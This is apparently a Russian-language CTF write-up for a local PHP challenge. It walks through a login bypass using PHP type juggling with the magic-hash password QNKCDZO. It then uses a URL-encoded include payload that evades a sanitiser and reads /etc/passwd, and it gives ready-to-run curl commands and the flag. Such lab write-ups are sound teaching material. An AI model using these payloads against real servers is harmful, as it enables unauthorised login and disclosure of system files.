Название: Vibecode Meme Generator

Сложность: High

### Райтап
На странице находится форма Lab sign-in и подсказка:

> The old login verifier compares results, not types. Inspect the request.

Игрок открывает DevTools → Network и видит:

```http
POST /login.php
Content-Type: application/x-www-form-urlencoded
```

## 2. Type Juggling на login

Обычные данные дают `401 Unauthorized`.

Подсказка про types направляет к PHP loose comparison и magic hash.

Известная строка:

```text
QNKCDZO
```

имеет MD5:

```text
0e830400451993494058024219903391
```

Сервер действительно использует PHP-проверку:

```php
md5($password) == $hash
```

Поэтому отправляем:

```text
username=admin&password=QNKCDZO
```

Через curl:

```bash
curl -i -c cookies.txt \
  -d 'username=admin&password=QNKCDZO' \
  http://localhost:8080/login.php
```

Ответ:

```http
302 Found
Location: /studio
Set-Cookie: capybara_session=admin; Path=/; HttpOnly
```

Важно сохранить cookie.

## 3. Meme Studio

После перехода на `/studio` игрок видит форму:

- Caption;
- Template;
- Render meme.

Подсказка:

> The renderer supports a legacy include directive. Input is cleaned before the template engine expands it. The two stages do not see exactly the same string.

Форма отправляет:

```http
POST /render.php
Content-Type: application/x-www-form-urlencoded
```

## 4. Проверка фильтра

Обычный шаблон `classic` работает.

Если отправить:

```text
[[include:/etc/passwd]]
```

сервер отвечает `Unknown template`, потому что санитизация удаляет:

```text
..
/
\\
etc
passwd
```

## 5. Обход санитизации

Фильтрация выполняется до URL-декодирования. Поэтому кодируем не только слэши, но и буквы, которые фильтр ищет буквально:

```text
%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D
```

После декодирования это становится:

```text
[[include:/etc/passwd]]
```

Команда:

```bash
curl -i -b cookies.txt \
  -d 'caption=capybara&template=%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D' \
  http://localhost:8080/render.php
```

Сервер возвращает `200 OK`, содержимое `/etc/passwd` и флаг:

```text
KubSTU{capybara_types_and_templates}
```
